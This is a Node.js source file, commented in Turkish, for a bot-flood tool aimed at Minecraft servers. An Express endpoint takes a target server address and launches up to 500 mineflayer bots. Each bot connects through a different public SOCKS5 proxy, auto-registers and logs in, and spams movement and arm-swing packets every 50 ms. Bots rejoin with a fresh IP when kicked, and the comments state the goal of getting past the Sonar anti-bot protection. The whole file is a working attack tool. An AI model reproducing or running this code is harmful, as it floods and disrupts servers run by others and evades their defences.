const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let proxyPool = [];

// 🔄 300+ TAZE PROXY ÇEKİCİ (Her bot farklı IP garantisi)
async function refreshProxyPool() {
    try {
        // Birden fazla kaynaktan 300'den fazla SOCKS5 çekiyoruz
        const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all');
        const data = await response.text();
        proxyPool = data.split('\n').filter(p => p.trim().length > 0).map(p => `socks5://${p.trim()}`);
        console.log(`[🌐] VIP PROXY HAVUZU GÜNCELLENDİ: ${proxyPool.length} AKTİF HAT!`);
    } catch (err) {
        console.log("[!] Proxy havuzu doldurulamadı, tekrar deneniyor...");
    }
}

refreshProxyPool();
setInterval(refreshProxyPool, 300000); // 5 dakikada bir havuzu tazele

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[🔥] INFINITY FLOW BAŞLADI: ${host}`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        // SANİYE BAŞI 2 BOT (Her 500ms'de bir giriş)
        setTimeout(() => {
            deploySingleBot(host, port, i);
        }, i * 500); 
    }
    res.json({ success: true, message: "Saniye başı 2 bot ve 300+ IP ile sızma başladı!" });
});

function deploySingleBot(host, port, index) {
    const currentProxy = proxyPool[index % proxyPool.length];
    if (!currentProxy) return;

    const agent = new ProxyAgent(currentProxy);
    const bot = mineflayer.createBot({
        host: host,
        port: port,
        username: `Vip_Resul_${Math.floor(Math.random() * 999999)}`,
        agent: agent, // %100 Farklı IP
        hideErrors: true,
        skipValidation: true
    });

    bot.on('spawn', () => {
        console.log(`[🚀] ${bot.username} Sızdı! IP: ${currentProxy}`);
        
        // KAYIT VE GİRİŞ
        bot.chat(`/register resul3163 resul3163`);
        bot.chat(`/login resul3163`);

        // ⚔️ AGRESİF MOD: KOŞ VE VUR (Sonar Delici)
        bot.setControlState('forward', true);
        bot.setControlState('sprint', true);

        setInterval(() => {
            if (bot.entity) {
                bot.swingArm('right'); // Sağ tık/Vuruş spam
                bot.look(Math.random() * 360, 0); // Etrafa bakış
            }
        }, 50); // Çok hızlı paket gönderimi
    });

    // SONAR ATARSA TEKRAR GİRİŞ (Infinity Loop)
    bot.on('end', () => {
        console.log(`[!] ${bot.username} Atıldı. Yeni IP ile tekrar deneniyor...`);
        setTimeout(() => deploySingleBot(host, port, Math.floor(Math.random() * 300)), 2000);
    });

    bot.on('error', (err) => {});
}

app.listen(process.env.PORT || 3000);
